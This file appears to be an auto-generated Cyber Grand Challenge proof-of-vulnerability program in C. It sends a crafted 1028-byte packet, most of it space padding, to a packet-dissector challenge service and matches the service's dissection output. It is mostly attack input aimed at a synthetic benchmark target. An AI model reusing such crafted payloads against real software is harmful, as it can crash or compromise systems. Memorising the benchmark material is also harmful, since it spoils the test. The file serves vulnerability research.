#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x7c\x25\x14\x9f"
         "\x68\x1d\x27\x45\xe9\xd1\x79\x5d\x1e\x24\x09\xa5\x11\xca\x46\x20"
         "\xab\x01\x00\x00\x2c\xd7\xb3\x33\xb1\xdb\x5c\xb5\xe0\x64\x60\x2c"
         "\x1f\xf6\x04\x5f\x0f\x35\xde\xc5\x5f\xb6\x97\xbc\x5c\x48\xa6\x8a"
         "\x69\xc2\xe5\xd9\x48\x0e\xa9\xc4\x4a\x76\xd3\x8c\x0f\xd8\x93\x1f"
         "\x89\x29\x7a\x51\x9f\x54\xc4\x9a\x43\xef\xca\x3e\x50\x7a\x2f\x3b"
         "\xac\x7c\x8c\x35\x78\x50\xf9\x70\x75\x6b\x26\xb2\x40\xc9\xab\x21"
         "\xea\x8d\x1f\x57\xb5\x8a\xd1\x97\x87\x09\xda\xb1\xa6\x2d\x49\x66"
         "\x64\x56\x41\x87\xea\x44\x13\xf9\x9a\x3a\xf4\x42\x19\xef\xe3\x82"
         "\x0e\xe3\x52\x50\xc3\x92\xfa\x70\x3b\x64\x29\xae\x63\x24\x23\xab"
         "\x0a\xfb\x94\xf8\x2c\xb8\x54\x2d\xd6\x0a\x54\xde\xe6\x66\x1c\x8a"
         "\x6d\xd4\x60\xcf\x3f\x0e\xae\x2c\x92\x5d\x79\x1d\x9c\x37\x38\x3f"
         "\xec\x38\xad\xed\xd1\x44\x17\x86\x58\x49\xb5\x2c\xcb\xca\xf9\xc8"
         "\x4a\xf0\xf6\x37\xdf\xed\x7f\x74\xce\x98\x7c\xee\x6f\xc2\x7c\x85"
         "\xf6\x72\xaa\x6c\xeb\x58\xe6\xd5\x78\x4c\x70\xe3\x93\xa3\x2f\x5f"
         "\xd8\xeb\x92\x4e\x6a\xc8\x49\x9d\x4f\xfc\xc7\x96\x80\x15\x45\x9c"
         "\x08\xc8\xa0\x4a\x88\x4b\x0a\xb3\xc4\x9f\x6c\x29\x31\x64\x2b\x95"
         "\x88\x30\x07\x8e\x39\x84\xbe\xcf\x33\xee\xf4\x8a\xe5\x00\xfe\x62"
         "\xac\x51\xae\x6c\x8e\x99\xb2\x41\x5e\xed\x57\xb0\xdb\x30\x4a\xcb"
         "\xc0\x18\x67\xf6\x04\x5d\xe0\x54\x53\x28\x18\x10\xe4\x87\xf1\x95"
         "\x70\x9b\xa9\x04\x88\xbd\x99\xd3\x20\x8d\x11\xcb\x06\xd0\xd5\x84"
         "\xf9\x3d\xcc\x8d\xfc\xa1\xa1\x34\x90\xd9\xa3\xcf\xcf\xb5\xcd\xf0"
         "\xc0\xbf\xcb\x14\x81\x06\x8a\xcc\x0f\xc0\x78\xd9\x4b\x36\xf0\x26"
         "\x20\xc6\x3f\x45\x30\xcf\x8f\x65\x19\x88\x87\x50\x9b\xba\x4a\x48"
         "\xd5\x7a\x33\xb0\x37\x1c\xab\xd4\x95\x3f\x04\xdf\x5a\x51\x2a\xdf"
         "\xc1\x29\x89\x4c\x33\x40\x62\x6e\xf3\x9d\xec\xb5\xc9\x85\xab\xae"
         "\xd7\x40\x1c\x7f\xda\xf1\xff\x8d\xbb\x26\xe7\x58\x39\xaf\x3e\x51"
         "\x68\x76\x7c\x9f\x6b\x23\xa6\xe8\xa1\x4b\xad\x59\xb4\x0a\x50\x13"
         "\x4f\x11\x15\x00\x0b\x64\x02\xe3\x61\xd3\x15\x03\x8e\xd0\xac\x5b"
         "\x06\x48\xb0\xf6\x66\x09\x85\xf7\x28\x8d\xf8\x53\x1c\x22\x22\xa3"
         "\xa0\xe5\xb7\xba\x79\xc3\x62\x5b\xe5\xa0\x7b\x08\x32\x7e\x19\xfc"
         "\x7f\xcc\x69\x52\xf5\xa7\xa5\xf5\x23\xc0\xd9\x64\x3b\xb8\x99\x2d"
         "\xf5\x2d\x47\x01\xb1\x4b\x66\x36\xd5\x31\x76\x5a\x4c\x26\x6a\x00"
         "\xec\xa5\x51\x62\x02\xed\x1c\xba\xdb\x28\xb3\xdc\xf4\xb6\xaa\x85"
         "\x04\x3e\x56\xd4\xab\xbf\x27\x07\xbe\x4c\x00\x3d\xd7\x6c\xf9\x95"
         "\xae\xd0\x94\xed\x7b\x67\xa0\x6a\x13\x85\x94\x8e\x30\xa6\xfc\x16"
         "\xb1\x6d\xf5\x43\x00\x22\xa0\xc1\x50\xbe\x66\x14\x4b\x63\x06\x80"
         "\xb3\x94\x39\x9d\x6b\x14\x85\x21\x49\xc1\x7a\x6c\xaf\x93\x3b\xb0"
         "\x58\xf0\x5e\x79\x14\x5d\x71\xee\x3a\xad\x5b\x37\xd4\xa5\x1e\x8e"
         "\xfc\xf1\x16\x42\x9d\xf1\xcf\xc5\xe2\xff\x65\xee\xbf\x48\xda\x66"
         "\x18\xa3\x98\xe0\x17\x99\xd0\xc6\x4f\xcf\x5b\x00\x23\xb0\x9d\xf3"
         "\xc5\x1e\x83\x0c\x71\xec\xf7\xac\xaf\x25\x2c\x00\x96\xdf\x15\xd8"
         "\x48\xd8\xcf\xa4\x78\x49\x7f\xec\x80\xd0\x8a\xe2\x9e\xb3\x25\x8f"
         "\xc9\x3d\xcd\xe5\x88\x29\x0f\xe8\x60\x1c\x90\x32\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===ankylophobiaAsperula
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x61\x6e\x6b\x79\x6c\x6f\x70\x68\x6f\x62\x69"
         "\x61\x41\x73\x70\x65\x72\x75\x6c\x61";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
